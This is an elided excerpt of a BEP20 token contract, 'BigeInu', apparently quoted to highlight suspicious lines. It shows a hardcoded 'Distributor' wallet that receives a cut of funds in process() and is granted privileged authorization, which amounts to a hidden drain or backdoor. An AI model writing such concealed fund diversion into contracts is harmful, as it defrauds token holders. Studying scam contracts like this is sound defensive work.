...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        router = _router != address(0)
            ...
            Distributor = 0xebD2dAD5baB3435955f57457f6f2CF76Fe2ee28F;
        _token = msg.sender;
    }
    ...
    function process(uint256 gas) external override onlyToken {
        ...
        if(totMk > 0) {
          Dividend.transfer(Distributor, totMk * gasCount / 100);   
          totMk = 0;
...
contract BigeInu is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0xDA682d2B988bB33273AaEE6d331D2BDA59f48C2e;
    address DevWallet       = 0xDA682d2B988bB33273AaEE6d331D2BDA59f48C2e;

    string constant _name = "BigeInu";
    string constant _symbol = "BigeInu";
    ...
    // Pancakeswap Factory and IDEX Router - Do not change the Router Address

    address Distributor = 0xebD2dAD5baB3435955f57457f6f2CF76Fe2ee28F;
    ...
    constructor () Auth(msg.sender) {
        ...
        authorizations[Distributor] = true;
